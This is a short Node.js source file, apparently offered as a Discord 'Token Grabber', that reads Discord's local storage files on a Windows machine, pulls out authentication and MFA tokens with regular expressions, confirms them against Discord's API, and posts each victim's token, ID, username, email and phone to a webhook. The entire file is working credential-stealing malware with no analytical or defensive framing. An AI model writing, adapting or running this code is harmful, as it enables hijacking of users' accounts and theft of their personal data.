const fs = require('fs')
const axios = require('axios')
const fetch = require('node-fetch')

var webhook = ""

try {
    fs.readdir(`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`, (err, files) => {
        var filtro = files.filter(f => f.split('.').pop() === "ldb")
        for (i = 0; i < filtro.length; i++) {
            fs.readFile(`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb/${filtro[i]}`, 'utf-8', async function (err, data) {

                let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                let regex2 = /"mfa\.[\d\w_-]{84}"/;

                let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                if (match != null) {
                    match = match.replace(/"/g, '')
                    await fetch(`https://discord.com/api/v6/users/@me`, {
                        headers: {
                            "authorization": `${match}`
                        }
                    }).then(resp => resp.json()).then(response => {
                        if(response.id) {
							send(match, response.id, response.username, response.discriminator, response.email, response.phone )
						}
                    })
                }
            })
        }
    })

    fs.readdir(`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`, (err, files) => {
        var filtro = files.filter(f => f.split('.').pop() === "log")
        for (i = 0; i < filtro.length; i++) {
            fs.readFile(`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb/${filtro[i]}`, 'utf-8', async function (err, data) {

                let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                let regex2 = /"mfa\.[\d\w_-]{84}"/;

                let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                if (match != null) {
					match = match.replace(/"/g, '')
                    await fetch(`https://discord.com/api/v6/users/@me`, {
                        headers: {
                            "authorization": `${match}`
                        }
                    }).then(resp => resp.json()).then(response => {
                        if(response.id) {
							send(match, response.id, response.username, response.discriminator, response.email, response.phone )
						}
                    })
                }
            })
        }
    })


} catch (err) {
    console.log(err)
}

function send(token, id, username, tag, email, phone) {
    if(email === null) {
        email = "Sem email"
    }
    if(phone === null) {
        phone = "Sem telefone"
    }
    axios.post(webhook, { "embeds":[
        {
            "description": `**TOKEN**\n\n${token}\n\n**ID**\n\n${id}\n\n**USERNAME**\n\n${username}#${tag}\n\n**EMAIL**\n\n${email}\n\n**PHONE**\n\n${phone}`,
        }
    ], "username": "Token Grabber", "avatar_url": "https://images-ext-2.discordapp.net/external/B4oFamfEYyF5a2IZk_Ef3RnDA9VHiY4orjoKp_LBZ00/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/621402634821042196/a0b719d919e2176f9603f3c3e84ad801.png?width=90&height=90" }, {
        headers: {
            'Content-Type': 'application/json',
        },
    })
}
